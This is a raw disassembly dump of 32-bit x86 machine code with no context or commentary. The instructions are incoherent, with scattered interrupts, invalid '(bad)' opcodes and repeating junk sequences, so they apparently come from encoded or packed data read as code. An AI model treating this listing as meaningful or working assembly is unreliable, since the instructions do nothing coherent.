  424318:	lea    esp,[ebp+0x3ba596cd]
  42431e:	fnstcw WORD PTR [ebx]
  424320:	psrlq  mm5,mm2
  424323:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424329:	int    0x1
  42432b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424331:	xchg   edx,eax
  424332:	push   ebx
  424333:	jecxz  0x424364
  424335:	rcl    ebp,1
  424337:	bound  eax,QWORD PTR [eax]
  424339:	jo     0x42436f
  42433b:	int    0x76
  42433d:	std    
  42433e:	int    0x8d
  424340:	std    
  424341:	cmp    edi,DWORD PTR [ecx+0x3b]
  424344:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42434b:	push   ebx
  42434c:	rol    DWORD PTR [ebx+0x76],cl
  42434f:	mov    ch,0xd6
  424351:	and    ch,cl
  424353:	jbe    0x4242f2
  424355:	int    0x8d
  424357:	popf   
  424358:	cmp    esi,eax
  42435a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42435d:	mov    ebp,0x28f2d392
  424362:	push   ebx
  424363:	jge    0x4243a8
  424365:	fld    TBYTE PTR [edi]
  424367:	pop    es
  424368:	xchg   esp,eax
  424369:	add    BYTE PTR [eax],al
  42436b:	add    ch,cl
  42436d:	jbe    0x42436c
  42436f:	int    0x8d
  424371:	std    
  424372:	cmp    edi,DWORD PTR [ecx+0x3b]
  424375:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42437c:	push   ebx
  42437d:	rol    DWORD PTR [ebx+0x76],cl
  424380:	mov    ch,0xd6
  424382:	and    ch,cl
  424384:	jbe    0x42437f
  424386:	int    0x8d
  424388:	stc    
  424389:	cmp    edi,DWORD PTR [ecx+0x3b]
  42438c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424393:	push   ebx
  424394:	rol    DWORD PTR [ecx-0x5f14428a],cl
  42439a:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  4243a4:	leave  
  4243a5:	jbe    0x42439c
  4243a7:	fdivr  st,st(4)
  4243a9:	sbb    al,0xb
  4243ab:	int    0xa6
  4243ad:	std    
  4243ae:	int    0x76
  4243b0:	std    
  4243b1:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4243b7:	xchg   edx,eax
  4243b8:	shr    DWORD PTR [ebp-0x1462acd8],cl
  4243be:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243c4:	std    
  4243c5:	int    0x8d
  4243c7:	std    
  4243c8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243cb:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243d2:	push   ebx
  4243d3:	ror    DWORD PTR [edx],cl
  4243d5:	jbe    0x4243c4
  4243d7:	int    0x76
  4243d9:	std    
  4243da:	int    0x8d
  4243dc:	std    
  4243dd:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243e0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243e7:	push   ebx
  4243e8:	ror    DWORD PTR [edx],cl
  4243ea:	jbe    0x4243e1
  4243ec:	int    0x8d
  4243ee:	std    
  4243ef:	int    0x76
  4243f1:	std    
  4243f2:	cmp    ecx,DWORD PTR [edi]
  4243f4:	cmp    ecx,ecx
  4243f6:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  4243fc:	push   ebx
  4243fd:	jge    0x4243cc
  4243ff:	jbe    0x424396
  424401:	inc    ebx
  424402:	jge    0x4243d8
  424404:	xchg   ch,cl
  424406:	test   BYTE PTR ds:0xcded760a,bl
  42440c:	jbe    0x4243bb
  42440e:	int    0x84
  424410:	sbb    eax,0xcdf5760a
  424415:	jbe    0x424414
  424417:	int    0x8d
  424419:	std    
  42441a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42441d:	lock shl edx,cl
  424420:	sub    bl,dl
  424422:	mov    ebp,0xcdd35392
  424427:	(bad)  
  424428:	in     eax,dx
  424429:	inc    ebx
  42442a:	rcl    esp,cl
  42442c:	push   esp
  42442d:	int    0x76
  42442f:	std    
  424430:	int    0x8d
  424432:	std    
  424433:	cmp    esi,eax
  424435:	cmp    edi,DWORD PTR [ecx-0x2d]
  424438:	repnz sub bl,dl
  42443b:	mov    ebp,0xcdd35392
  424440:	(bad)  
  424441:	in     eax,dx
  424442:	shr    ebx,cl
  424444:	sub    al,BYTE PTR [ebx-0x2d]
  424447:	aam    0x1c
  424449:	int    0x8d
  42444b:	in     eax,dx
  42444c:	int    0x76
  42444e:	dec    esp
  42444f:	int    0x1
  424451:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424457:	retf   
  424458:	jno    0x42445a
  42445a:	(bad)  
  42445b:	mov    ch,0x0
  42445d:	jo     0x4243e7
  42445f:	in     al,dx
  424460:	push   ds
  424461:	int    0x76
  424463:	cmc    
  424464:	xchg   DWORD PTR [esi-0x78],esi
  424467:	int    0x8d
  424469:	dec    esp
  42446a:	int    0xa
  42446c:	adc    DWORD PTR [ecx+0x6d048080],eax
  424472:	xchg   edx,eax
  424473:	jo     0x424475
  424475:	(bad)  
  424476:	mov    ch,0x0
  424478:	jno    0x424402
  42447a:	or     dh,BYTE PTR [esi-0xb]
  42447d:	int    0x76
  42447f:	std    
  424480:	int    0x8d
  424482:	std    
  424483:	cmp    edi,DWORD PTR [ecx+0x3b]
  424486:	lock shl edx,cl
  424489:	sub    bl,dl
  42448b:	mov    ebp,0xcdd35392
  424490:	(bad)  
  424491:	cmc    
  424492:	inc    ebx
  424493:	ror    ebp,cl
  424495:	jbe    0x424490
  424497:	int    0x8d
  424499:	stc    
  42449a:	(bad)  
  42449b:	xor    DWORD PTR [ebx],edi
  42449d:	jns    0x4244da
  42449f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244a6:	push   ebx
  4244a7:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  4244ad:	cmp    esi,eax
  4244af:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244b2:	repnz sub bl,dl
  4244b5:	mov    ebp,0xcdd35392
  4244ba:	(bad)  
  4244bb:	cmc    
  4244bc:	das    
  4244bd:	rcl    ebx,1
  4244bf:	int    0x8d
  4244c1:	lods   eax,DWORD PTR ds:[esi]
  4244c2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244c9:	(bad)  
  4244ca:	stc    
  4244cb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244ce:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244d5:	push   ebx
  4244d6:	rol    DWORD PTR [edi-0x2893263],cl
  4244dc:	int    0x8d
  4244de:	std    
  4244df:	cmp    esi,eax
  4244e1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244e4:	repnz sub bl,dl
  4244e7:	mov    ebp,0xcdd35392
  4244ec:	lea    ebp,[ebp+0x2f1f845e]
  4244f2:	push   es
  4244f3:	or     al,0xff
  4244f5:	add    BYTE PTR [eax],al
  4244f7:	int    0x76
  4244f9:	adc    ebp,ecx
  4244fb:	lea    edx,[ecx]
  4244fd:	ins    BYTE PTR es:[edi],dx
  4244fe:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424504:	test   BYTE PTR [eax-0x2cac7f80],al
  42450a:	int    0x8d
  42450c:	icebp  
  42450d:	push   esi
  42450e:	dec    ecx
  42450f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424515:	add    BYTE PTR [eax],al
  424517:	int    0x76
  424519:	std    
  42451a:	int    0x8d
  42451c:	std    
  42451d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424520:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424527:	push   ebx
  424528:	rcr    DWORD PTR [esi+0x76],cl
  42452b:	mov    ebp,0x76cd88d6
  424530:	stc    
  424531:	int    0x8d
  424533:	stc    
  424534:	in     al,dx
  424535:	xchg   ch,cl
  424537:	jbe    0x424536
  424539:	int    0x8d
  42453b:	std    
  42453c:	cmp    esi,eax
  42453e:	cmp    edi,DWORD PTR [ecx-0x56]
  424541:	shl    edx,cl
  424543:	sub    bl,dl
  424545:	mov    ebp,0xd353a892
  42454a:	arpl   bx,cx
  42454c:	ror    BYTE PTR [eax-0x12326980],cl
  424552:	add    al,0xed
  424554:	xor    al,0xc9
  424556:	jbe    0x424555
  424558:	dec    ecx
  424559:	and    DWORD PTR [esi-0x528936cb],eax
  42455f:	inc    ecx
  424560:	and    DWORD PTR [esi+0x4c76cd35],eax
  424566:	or     dh,BYTE PTR [esi+0x4c]
  424569:	cwde   
  42456a:	int    0x6d
  42456c:	int    0x76
  42456e:	std    
  42456f:	int    0x96
  424571:	std    
  424572:	sar    bh,0x5f
  424575:	shl    DWORD PTR [ecx],1
  424577:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  42457d:	cdq    
  42457e:	shr    edx,cl
  424580:	sub    bl,dl
  424582:	mov    ebp,0xcdd25392
  424587:	xchg   esi,eax
  424588:	mov    BYTE PTR [ebx-0xf],al
  42458b:	das    
  42458c:	add    eax,0x80808159
  424591:	int    0x76
  424593:	mov    ch,cl
  424595:	xchg   esi,eax
  424596:	mov    BYTE PTR [edi+0xa9a6470],al
  42459c:	xchg   esi,eax
  42459d:	cmc    
  42459e:	leave  
  42459f:	jbe    0x42459a
  4245a1:	popa   
  4245a2:	and    DWORD PTR [esi-0x68932cb],eax
  4245a8:	int    0x96
  4245aa:	stc    
  4245ab:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  4245b1:	rcl    ebx,cl
  4245b3:	mov    ebp,0xcdd25392
  4245b8:	xchg   esi,eax
  4245b9:	std    
  4245ba:	int    0xe6
  4245bc:	std    
  4245bd:	cmp    esp,ebx
  4245bf:	cmp    edi,edi
  4245c1:	shr    ecx,cl
  4245c3:	sub    bl,dl
  4245c5:	repz xchg edx,eax
  4245c7:	push   ebx
  4245c8:	fxch   st(5)
  4245ca:	out    0xf5,al
  4245cc:	pop    esi
  4245cd:	xchg   esp,eax
  4245ce:	leave  
  4245cf:	fsubr  QWORD PTR [edi]
  4245d1:	add    eax,0x8080816b
  4245d6:	int    0x96
  4245d8:	cmc    
  4245d9:	int    0x76
  4245db:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  4245e1:	or     ch,0x96
  4245e4:	mov    ch,cl
  4245e6:	out    0xf5,al
  4245e8:	xor    ebx,DWORD PTR [edx-0x21932ac]
  4245ee:	pop    ebx
  4245ef:	int    0xa6
  4245f1:	std    
  4245f2:	cmp    edi,edx
  4245f4:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  4245fa:	in     eax,0x28
  4245fc:	push   ebx
  4245fd:	cld    
  4245fe:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424604:	add    eax,0x8080814f
  424609:	int    0x96
  42460b:	std    
  42460c:	int    0xe6
  42460e:	std    
  42460f:	cmp    esp,ebx
  424611:	cmp    edi,edi
  424613:	shl    ebx,cl
  424615:	xchg   edx,eax
  424616:	shr    ecx,cl
  424618:	sub    BYTE PTR [ebx-0x27],dl
  42461b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424621:	mov    dl,0x21
  424623:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424629:	out    0xfd,al
  42462b:	cmp    esp,ebx
  42462d:	cmp    edi,edi
  42462f:	shl    ebx,cl
  424631:	xchg   edx,eax
  424632:	shr    ecx,cl
  424634:	sub    BYTE PTR [ebx-0x27],dl
  424637:	jmp    0x42463b
  424639:	add    BYTE PTR [eax-0x2693280],0xcd
  424640:	(bad)  
  424641:	std    
  424642:	add    al,0xf7
  424644:	(bad)  
  424645:	cmp    esp,ebx
  424647:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42464d:	push   ebx
  42464e:	cdq    
  42464f:	iret   
  424650:	ja     0x42464b
  424652:	jecxz  0x424643
  424654:	inc    ebx
  424655:	cdq    
  424656:	das    
  424657:	add    al,0x21
  424659:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424660:	jo     0x4245ea
  424662:	or     dl,dh
  424664:	mov    ch,0x2f
  424666:	mov    ebx,0xea121a
  42466b:	das    
  42466c:	add    BYTE PTR [eax-0x321269f6],0x96
  424673:	in     eax,dx
  424674:	xchg   DWORD PTR [eax],esi
  424676:	int    0xd6
  424678:	in     eax,dx
  424679:	xchg   DWORD PTR [eax-0x2d],edx
  42467c:	repz sub bl,dl
  42467f:	mov    ecx,0x2ffb5392
  424684:	mov    ebx,0x4cf3d31a
  424689:	adc    dh,bh
  42468b:	dec    ecx
  42468c:	and    DWORD PTR [esi-0x1229f5cb],eax
  424692:	or     dl,BYTE PTR [esi-0x12693243]
  424698:	int    0xd6
  42469a:	in     eax,dx
  42469b:	cmp    esp,ebx
  42469d:	add    al,0xf7
  42469f:	call   ebx
  4246a1:	repz xchg edx,eax
  4246a3:	sar    DWORD PTR [ecx-0x7866acd8],cl
  4246a9:	xchg   esi,eax
  4246aa:	mov    BYTE PTR [edx],cl
  4246ac:	xchg   esi,eax
  4246ad:	in     eax,dx
  4246ae:	int    0x96
  4246b0:	dec    esp
  4246b1:	int    0xd6
  4246b3:	dec    esp
  4246b4:	cmp    esp,ebx
  4246b6:	add    al,0xf7
  4246b8:	call   ebx
  4246ba:	mov    ecx,0x92f3d328
  4246bf:	push   ebx
  4246c0:	cdq    
  4246c1:	int    0xd6
  4246c3:	mov    ebp,0x32d6fb43
  4246c8:	int    0x96
  4246ca:	dec    esp
  4246cb:	int    0xd6
  4246cd:	dec    esp
  4246ce:	cmp    esp,ebx
  4246d0:	add    al,0xf7
  4246d2:	call   ebx
  4246d4:	mov    ecx,0x92f3d328
  4246d9:	push   ebx
  4246da:	cdq    
  4246db:	int    0xd6
  4246dd:	mov    ebp,0x88d6fb43
  4246e2:	int    0x96
  4246e4:	in     eax,dx
  4246e5:	int    0xd6
  4246e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246e8:	add    DWORD PTR [edx+0x4],0x8d0092c9
  4246ef:	mov    ch,0x2f
  4246f1:	push   es
  4246f2:	xchg   ebx,eax
  4246f3:	add    BYTE PTR [eax],al
  4246f5:	add    BYTE PTR [ecx-0x6932ee5a],al
  4246fb:	stc    
  4246fc:	int    0xd6
  4246fe:	stc    
  4246ff:	cmp    esp,ebx
  424701:	add    al,0xf7
  424703:	call   ebx
  424705:	mov    ecx,0x92f3d328
  42470a:	push   ebx
  42470b:	cdq    
  42470c:	int    0xd6
  42470e:	adc    ebp,ecx
  424710:	out    0xf5,al
  424712:	inc    ebx
  424713:	aam    0xd9
  424715:	in     al,0x77
  424717:	sub    al,0xcd
  424719:	xchg   esi,eax
  42471a:	std    
  42471b:	int    0xd6
  42471d:	std    
  42471e:	cmp    esp,ebx
  424720:	add    al,0xf7
  424722:	call   ebx
  424724:	repz xchg edx,eax
  424726:	sar    DWORD PTR [ecx+0x53c58728],cl
  42472c:	cdq    
  42472d:	int    0x9c
  42472f:	test   BYTE PTR [ebx-0x1e],al
  424732:	das    
  424733:	push   es
  424734:	test   BYTE PTR [eax],al
  424736:	add    BYTE PTR [eax],al
  424738:	arpl   bp,cx
  42473a:	jbe    0x4246e9
  42473c:	cmp    edx,ebx
  42473e:	int    0x8d
  424740:	lods   eax,DWORD PTR ds:[esi]
  424741:	add    al,0x2
  424743:	jmp    FWORD PTR [edx+0x76cd4aec]
  424749:	std    
  42474a:	cmp    edx,ebx
  42474c:	int    0x8d
  42474e:	std    
  42474f:	cmp    ecx,DWORD PTR [edi]
  424751:	shl    edx,cl
  424753:	sub    bl,dl
  424755:	mov    ebp,0xa8d35392
  42475a:	retf   
  42475b:	ror    BYTE PTR [eax-0x12326980],cl
  424761:	adc    ch,ch
  424763:	xchg   ebp,eax
  424764:	add    BYTE PTR [eax-0x2893680],0x49
  42476b:	and    DWORD PTR [esi-0x68936cb],eax
  424771:	inc    ecx
  424772:	and    DWORD PTR [esi-0x28932cb],eax
  424778:	int    0x8d
  42477a:	std    
  42477b:	cwde   
  42477c:	call   0x8621:0xd169ffc0
  424783:	xor    eax,0xbdd3793b
  424788:	xchg   edx,eax
  424789:	mov    al,ds:0xf2d3133b
  42478e:	sub    BYTE PTR [ebx-0x2d],dl
  424791:	or     dh,BYTE PTR [esi-0x53]
  424794:	int    0x76
  424796:	std    
  424797:	int    0x8d
  424799:	std    
  42479a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42479d:	mov    ebp,0xd3133b92
  4247a2:	repnz sub BYTE PTR [ebx-0x2d],dl
  4247a6:	or     dh,BYTE PTR [esi-0xf]
  4247a9:	int    0xe6
  4247ab:	and    al,0xcd
  4247ad:	jbe    0x42479c
  4247af:	int    0x8d
  4247b1:	in     eax,dx
  4247b2:	cmp    edx,ebx
  4247b4:	or     dh,BYTE PTR [esi-0x13]
  4247b7:	adc    dh,BYTE PTR [esi-0x13]
  4247ba:	dec    ecx
  4247bb:	mov    al,ds:0x76cd3586
  4247c0:	cmc    
  4247c1:	int    0x8d
  4247c3:	cmc    
  4247c4:	cmp    edx,ebx
  4247c6:	or     dh,BYTE PTR [esi-0xb]
  4247c9:	adc    dh,BYTE PTR [esi-0xb]
  4247cc:	dec    ecx
  4247cd:	lahf   
  4247ce:	xchg   BYTE PTR ds:0xcd1176cd,dh
  4247d4:	lea    edx,[ecx]
  4247d6:	cmp    edx,ebx
  4247d8:	or     dh,BYTE PTR [esi+0x11]
  4247db:	adc    dh,BYTE PTR [esi+0x11]
  4247de:	imul   esp,DWORD PTR [ecx],0x76cd3586
  4247e4:	mov    ch,0xcd
  4247e6:	lea    esi,[ebp+0x760ad33b]
  4247ec:	mov    ch,0x12
  4247ee:	jbe    0x4247a5
  4247f0:	dec    ecx
  4247f1:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  4247f8:	hlt    
  4247f9:	mov    esi,DWORD PTR ds:0x68876cd
  4247ff:	ins    DWORD PTR es:[edi],dx
  424800:	das    
  424801:	add    eax,0x80808551
  424806:	int    0x76
  424808:	dec    esp
  424809:	push   es
  42480a:	ins    DWORD PTR es:[edi],dx
  42480b:	das    
  42480c:	add    eax,0x80808538
  424811:	int    0x76
  424813:	sbb    al,0x6
  424815:	ins    DWORD PTR es:[edi],dx
  424816:	das    
  424817:	add    eax,0x80808523
  42481c:	int    0x76
  42481e:	and    al,0xcd
  424820:	jbe    0x424846
  424822:	int    0x8d
  424824:	mov    bl,dl
  424826:	mov    ebp,0x39af5692
  42482b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424832:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42483c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42483f:	mov    ebp,0xd3133b92
  424844:	repnz sub BYTE PTR [ebx-0x2d],dl
  424848:	or     dh,BYTE PTR [esi-0xf]
  42484b:	int    0x76
  42484d:	std    
  42484e:	int    0x76
  424850:	std    
  424851:	int    0x76
  424853:	mov    ch,cl
  424855:	lea    ecx,[eax-0x329b8379]
  42485b:	outs   dx,BYTE PTR ds:[esi]
  42485c:	jo     0x424868
  42485e:	lea    esp,[esi+eax*1]
  424861:	ins    DWORD PTR es:[edi],dx
  424862:	das    
  424863:	add    eax,0x808084f0
  424868:	leave  
  424869:	jbe    0x424800
  42486b:	dec    ecx
  42486c:	and    DWORD PTR [eax+0x35],edi
  42486f:	int    0x76
  424871:	xchg   ebp,eax
  424872:	pop    ebx
  424873:	int    0xa6
  424875:	xchg   ebp,eax
  424876:	cmp    edi,DWORD PTR [ecx+0x3b]
  424879:	loop   0x42484e
  42487b:	mov    ebp,0x28e5d392
  424880:	push   ebx
  424881:	popf   
  424882:	or     ah,BYTE PTR [esi-0x289326b]
  424888:	int    0x76
  42488a:	std    
  42488b:	int    0x8
  42488d:	sub    eax,0xcd808081
  424892:	xor    ch,cl
  424894:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  424898:	int    0x76
  42489a:	std    
  42489b:	int    0x76
  42489d:	std    
  42489e:	int    0x8
  4248a0:	and    eax,0xcd808081
  4248a5:	sbb    al,0xa
  4248a7:	xchg   esi,eax
  4248a8:	dec    esp
  4248a9:	inc    ebx
  4248aa:	fst    st(6)
  4248ac:	push   0xffffffcd
  4248ae:	(bad)  
  4248af:	cmc    
  4248b0:	int    0x8
  4248b2:	adc    DWORD PTR [ecx-0x69307f80],eax
  4248b8:	lods   eax,DWORD PTR ds:[esi]
  4248b9:	(bad)  
  4248ba:	int    0x96
  4248bc:	cmc    
  4248bd:	cmp    ecx,DWORD PTR [edi]
  4248bf:	add    al,0xfb
  4248c1:	call   ebx
  4248c3:	jmp    0x424857
  4248c5:	shr    edx,cl
  4248c7:	sub    BYTE PTR [ebx-0x1d],dl
  4248ca:	int    0x8d
  4248cc:	dec    esp
  4248cd:	bound  eax,QWORD PTR [eax]
  4248cf:	xchg   ecx,eax
  4248d0:	jo     0x42492d
  4248d2:	add    BYTE PTR [eax+0x24],dh
  4248d5:	int    0x8d
  4248d7:	dec    esp
  4248d8:	int    0x6e
  4248da:	xchg   esp,eax
  4248db:	int    0x7e
  4248dd:	jo     0x424912
  4248df:	jge    0x424952
  4248e1:	xchg   ebp,eax
  4248e3:	jo     0x4248a2
  4248e5:	dec    esi
  4248e6:	xchg   BYTE PTR [eax+0x248dcd80],al
  4248ec:	int    0x8
  4248ee:	xor    eax,0xa808081
  4248f3:	sbb    al,0x0
  4248f5:	xchg   ecx,eax
  4248f6:	xchg   esp,eax
  4248f7:	add    dh,dl
  4248f9:	mov    BYTE PTR [ebx-0x43],bl
  4248fc:	or     eax,0xcd808084
  424901:	pop    ebx
  424902:	fs xchg ebp,edx
  424905:	das    
  424906:	mov    ebx,0x74cf1452
  42490b:	xor    BYTE PTR [edx+ecx*1],bl
  42490e:	jbe    0x42492c
  424910:	int    0x76
  424912:	std    
  424913:	int    0x8d
  424915:	std    
  424916:	cmp    edi,DWORD PTR [ecx+0x4]
  424919:	add    bh,bh
  42491b:	shl    edx,cl
  42491d:	sub    bl,dl
  42491f:	mov    ebp,0x2fd35392
  424924:	mov    ebx,0x960a868a
  424929:	and    al,0x43
  42492b:	jge    0x42495c
  42492d:	add    eax,0x808080e9
  424932:	int    0x76
  424934:	std    
  424935:	int    0x8d
  424937:	std    
  424938:	cmp    edi,DWORD PTR [ecx+0x4]
  42493b:	add    bh,bh
  42493d:	shl    edx,cl
  42493f:	sub    bl,dl
  424941:	mov    ebp,0xad35392
  424946:	jbe    0x4248ed
  424948:	int    0x76
  42494a:	stc    
  42494b:	int    0x8d
  42494d:	stc    
  42494e:	add    al,0x2
  424950:	(bad)  
  424951:	cmp    edi,DWORD PTR [ecx-0x2d]
  424954:	repnz sub bl,dl
  424957:	mov    ebp,0x2fd35392
  42495c:	mov    ebx,0x7d33868a
  424961:	pop    esi
  424962:	lea    esp,[ebp-0x7f2ef7d1]
  424968:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42496f:	mov    BYTE PTR [edx],cl
  424971:	lea    ebx,[esp+ebp*8]
  424974:	xchg   ebp,ecx
  424976:	lea    ebx,[ecx*8+0x31cd5c52]
  42497d:	or     dh,BYTE PTR [esi-0x63]
  424980:	jl     0x424988
  424982:	icebp  
  424983:	aam    0x89
  424985:	clc    
  424986:	icebp  
  424987:	sub    edx,edx
  424989:	xchg   DWORD PTR [esi-0x63],esi
  42498c:	in     al,dx
  42498d:	xchg   edx,eax
  42498e:	int    0xd2
  424990:	jo     0x42495f
  424992:	outs   dx,BYTE PTR ds:[esi]
  424993:	test   BYTE PTR [edi+0x63bd70c5],al
  424999:	test   DWORD PTR [eax+0x1c76cd80],eax
  42499f:	int    0x7c
  4249a1:	mov    BYTE PTR [edx],cl
  4249a3:	lea    ebx,[ebp-0x32027233]
  4249a9:	xchg   esi,eax
  4249aa:	std    
  4249ab:	cmp    ecx,DWORD PTR [edi]
  4249ad:	add    al,0xfb
  4249af:	call   ebx
  4249b1:	jmp    0x424945
  4249b3:	shr    edx,cl
  4249b5:	sub    BYTE PTR [ebx+0x13],dl
  4249b8:	pop    esi
  4249b9:	lea    ebx,[ebp-0x7232e32c]
  4249bf:	mov    BYTE PTR [edi-0x29ffb384],al
  4249c5:	popf   
  4249c6:	int    0x6c
  4249c8:	test   BYTE PTR [ecx-0x79],dh
  4249cb:	lds    esi,FWORD PTR [eax-0x43]
  4249ce:	add    eax,DWORD PTR [edi+0x76cd8080]
  4249d4:	sbb    al,0xcd
  4249d6:	(bad)  
  4249d7:	stc    
  4249d8:	int    0x96
  4249da:	stc    
  4249db:	cmp    ecx,DWORD PTR [edi]
  4249dd:	shr    ebx,cl
  4249df:	xchg   edx,eax
  4249e0:	add    al,0xfb
  4249e2:	inc    DWORD PTR [ebp*2+0x28ead33c]
  4249e9:	push   ebx
  4249ea:	adc    eax,DWORD PTR [ecx-0x69325a73]
  4249f0:	and    al,0xa
  4249f2:	jbe    0x424a10
  4249f4:	int    0x76
  4249f6:	stc    
  4249f7:	int    0x8d
  4249f9:	stc    
  4249fa:	add    al,0x2
  4249fc:	(bad)  
  4249fd:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a00:	repnz sub bl,dl
  424a03:	mov    ebp,0xcdd35392
  424a08:	lea    esp,[edi+ebp*1]
  424a0b:	mov    ebx,0x7d33867e
  424a10:	pop    esi
  424a11:	lea    esp,[ebp+0xa4072f]
  424a17:	add    BYTE PTR [eax],al
  424a19:	int    0x8
  424a1b:	and    eax,0x43808081
  424a20:	sbb    al,0xd6
  424a22:	cmp    ecx,ebp
  424a24:	lea    edx,[ecx]
  424a26:	int    0x8
  424a28:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a2e:	lods   eax,DWORD PTR ds:[esi]
  424a2f:	(bad)  
  424a30:	int    0x96
  424a32:	adc    DWORD PTR [ebx],edi
  424a34:	(bad)  
  424a36:	sti    
  424a37:	call   ebx
  424a39:	jmp    0x4249cd
  424a3b:	shr    edx,cl
  424a3d:	sub    BYTE PTR [ebx-0x1d],dl
  424a40:	int    0x8d
  424a42:	dec    esp
  424a43:	bound  eax,QWORD PTR [eax]
  424a45:	xchg   ecx,eax
  424a46:	xchg   esp,eax
  424a47:	pop    ebx
  424a48:	add    BYTE PTR [eax+0x24],dh
  424a4b:	push   es
  424a4c:	ins    DWORD PTR es:[edi],dx
  424a4d:	das    
  424a4e:	add    eax,0x808092d9
  424a53:	int    0x96
  424a55:	and    al,0xcd
  424a57:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a5d:	or     ch,0x7d
  424a60:	cmp    ecx,DWORD PTR [edi]
  424a62:	add    al,0x11
  424a64:	call   ebx
  424a66:	jmp    0x4249fa
  424a68:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a6e:	add    eax,0x808081da
  424a73:	int    0x76
  424a75:	std    
  424a76:	int    0x8d
  424a78:	std    
  424a79:	cmp    edi,DWORD PTR [ecx+0x4]
  424a7c:	add    bh,bh
  424a7e:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424a84:	push   ebx
  424a85:	ror    DWORD PTR [edx],cl
  424a87:	jbe    0x424a46
  424a89:	pop    ebp
  424a8a:	push   0xcf35869f
  424a8f:	jl     0x424a3e
  424a91:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424a97:	leave  
  424a98:	jbe    0x424adf
  424a9a:	sbb    BYTE PTR [edi+0x76c93586],bl
  424aa0:	shr    al,1
  424aa2:	lahf   
  424aa3:	xchg   BYTE PTR ds:0xc955760a,dh
  424aa9:	jbe    0x424b18
  424aab:	dec    ecx
  424aac:	and    DWORD PTR [esi-0x3234c4cb],eax
  424ab2:	xchg   esp,eax
  424ab3:	iret   
  424ab4:	inc    ebp
  424ab5:	shl    ebx,cl
  424ab7:	xchg   edx,eax
  424ab8:	adc    bh,bl
  424aba:	scas   eax,DWORD PTR es:[edi]
  424abb:	cmp    DWORD PTR [eax+0x150ab880],eax
  424ac1:	lea    esi,[eax+eax*1+0x0]
  424ac5:	add    BYTE PTR [esi+0x4],ch
  424ac8:	cli    
  424ac9:	xchg   BYTE PTR [edx-0x6047a019],al
  424acf:	xchg   BYTE PTR ds:0x94060a,dh
  424ad5:	add    BYTE PTR [eax],al
  424ad7:	or     al,BYTE PTR [esi]
  424ad9:	mov    esp,0xa000000
  424ade:	jbe    0x424a90
  424ae0:	or     dh,BYTE PTR [esi+0x15]
  424ae3:	iret   
  424ae4:	outs   dx,BYTE PTR ds:[esi]
  424ae5:	std    
  424ae6:	iret   
  424ae7:	jno    0x424b59
  424ae9:	or     dh,BYTE PTR [esi+0x2d]
  424aec:	or     dh,BYTE PTR [esi+0x35]
  424aef:	leave  
  424af0:	push   es
  424af1:	jo     0x424af3
  424af3:	add    BYTE PTR [eax],al
  424af5:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424afb:	pushf  
  424afc:	add    BYTE PTR [eax],al
  424afe:	add    BYTE PTR [edx],cl
  424b00:	pop    ss
  424b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b02:	add    BYTE PTR [eax],al
  424b04:	add    cl,cl
  424b06:	push   es
  424b07:	lods   al,BYTE PTR ds:[esi]
  424b08:	add    BYTE PTR [eax],al
  424b0a:	add    BYTE PTR [edx-0x61],cl
  424b0d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b13:	add    BYTE PTR [eax],al
  424b15:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b1b:	les    eax,FWORD PTR [eax]
  424b1d:	add    BYTE PTR [eax],al
  424b1f:	popa   
  424b20:	lahf   
  424b21:	xchg   BYTE PTR ds:0x9006c9,dh
  424b27:	add    BYTE PTR [eax],al
  424b29:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b2f:	aam    0x0
  424b31:	add    BYTE PTR [eax],al
  424b33:	call   0xa77d1d7
  424b38:	iret   
  424b39:	fadd   QWORD PTR [eax]
